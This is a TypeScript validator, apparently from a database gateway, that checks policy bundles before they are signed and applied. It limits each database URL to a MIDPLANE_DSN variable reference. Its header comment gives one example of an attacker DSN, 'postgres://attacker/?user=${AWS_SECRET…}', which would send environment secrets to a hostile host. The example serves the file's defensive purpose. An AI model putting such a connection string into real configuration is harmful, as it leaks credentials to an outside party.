// Can a gateway enforce this bundle's policy? One function, run in two places:
//
//   • by the gateway, on every authentic bundle, before applying it. A "no"
//     halts the gateway (see bundle.ts for why halting beats keeping an older
//     bundle the customer already replaced).
//   • by the control plane, on every bundle BEFORE signing it. The same code
//     answering the same question means a control-plane serializer bug fails
//     one save instead of halting every customer's gateway.
//
// On top of the engine's own policy parser (schema, requires_features), a
// gateway bundle must:
//
//   • use the `databases:` shape, with nothing stated at the top level that a
//     `databases:` document would silently ignore;
//   • state table_access and guardrails on every database — neither has a safe
//     "off", and full replacement would otherwise read an omission as the
//     permissive default;
//   • name each database's connection ONLY as `${MIDPLANE_DSN_<id>}`. The bundle
//     picks which customer-provided DSN variable a database uses and nothing
//     else: no literal DSN, no host, no reference to any other variable. A
//     control plane that could write `postgres://attacker/?user=${AWS_SECRET…}`
//     could make a gateway ship its environment to a host of its choosing.

import yaml from "js-yaml";
import { parsePolicyYaml, type DatabaseSpec } from "../config.ts";

/** A database URL in a gateway bundle must be exactly one of these. */
export const DSN_REF_RE = /^\$\{(MIDPLANE_DSN_[A-Z0-9_]+)\}$/;

// Legacy single-DB keys. Beside a `databases:` block the engine ignores them
// with a warning — so in a bundle they would be controls nobody enforces.
const IGNORED_TOP_LEVEL = [
  "table_access",
  "tenant_scope",
  "guardrails",
  "approvals",
  "column_masks",
  "mask_source_rewrite",
];

export interface BundleDatabase {
  /** Resolved spec with `url: ""` — the DSN is the gateway's to supply. */
  spec: DatabaseSpec;
  /** The env var the DSN is read from, e.g. MIDPLANE_DSN_01J8Z6R… */
  dsnEnv: string;
}

export type BundlePolicyCheck =
  | { ok: true; databases: BundleDatabase[] }
  | { ok: false; reason: string };

export function checkBundlePolicy(policyYaml: string): BundlePolicyCheck {
  let doc: unknown;
  try {
    doc = yaml.load(policyYaml);
  } catch (err) {
    return { ok: false, reason: `policy is not valid YAML: ${(err as Error).message}` };
  }
  if (typeof doc !== "object" || doc === null || Array.isArray(doc)) {
    return { ok: false, reason: "policy must be a YAML mapping with a databases: list" };
  }
  const top = doc as Record<string, unknown>;

  const ignored = IGNORED_TOP_LEVEL.filter((k) => Object.prototype.hasOwnProperty.call(top, k));
  if (ignored.length > 0) {
    return {
      ok: false,
      reason: `policy states ${ignored.join(", ")} at the top level, where a databases: policy ignores it; state it per database`,
    };
  }
  // Any other unknown top-level key is left to the engine parser, which strips
  // it — new policy vocabulary is fenced by requires_features, as today.

  const raw = top.databases;
  if (!Array.isArray(raw) || raw.length === 0) {
    return { ok: false, reason: "policy must list at least one database under databases:" };
  }

  const dsnEnvs: string[] = [];
  for (const [i, entry] of raw.entries()) {
    if (typeof entry !== "object" || entry === null || Array.isArray(entry)) {
      return { ok: false, reason: `databases[${i}] is not a mapping` };
    }
    const e = entry as Record<string, unknown>;
    const label = typeof e.name === "string" ? `database "${e.name}"` : `databases[${i}]`;
    const m = typeof e.url === "string" ? DSN_REF_RE.exec(e.url) : null;
    if (!m) {
      return {
        ok: false,
        reason: `${label} url must be exactly \${MIDPLANE_DSN_<id>}; a bundle names which DSN variable to use, never a connection`,
      };
    }
    for (const section of ["table_access", "guardrails"]) {
      if (!Object.prototype.hasOwnProperty.call(e, section)) {
        return { ok: false, reason: `${label} has no ${section} section; a gateway bundle states it explicitly` };
      }
    }
    dsnEnvs.push(m[1]!);
  }

  // Interpolation needs every referenced variable to have a value; the real
  // DSNs are the gateway's business, applied after this check. A placeholder
  // that is visibly not a DSN keeps the parse honest.
  const env: NodeJS.ProcessEnv = {};
  for (const name of dsnEnvs) env[name] = `unresolved:${name}`;

  let loaded;
  try {
    loaded = parsePolicyYaml(policyYaml, "bundle", env);
  } catch (err) {
    return { ok: false, reason: (err as Error).message };
  }
  if (!loaded.hasDatabasesBlock || loaded.databases.length !== dsnEnvs.length) {
    return { ok: false, reason: "policy databases did not resolve one-to-one" };
  }

  return {
    ok: true,
    databases: loaded.databases.map((spec, i) => ({
      spec: { ...spec, url: "" },
      dsnEnv: dsnEnvs[i]!,
    })),
  };
}
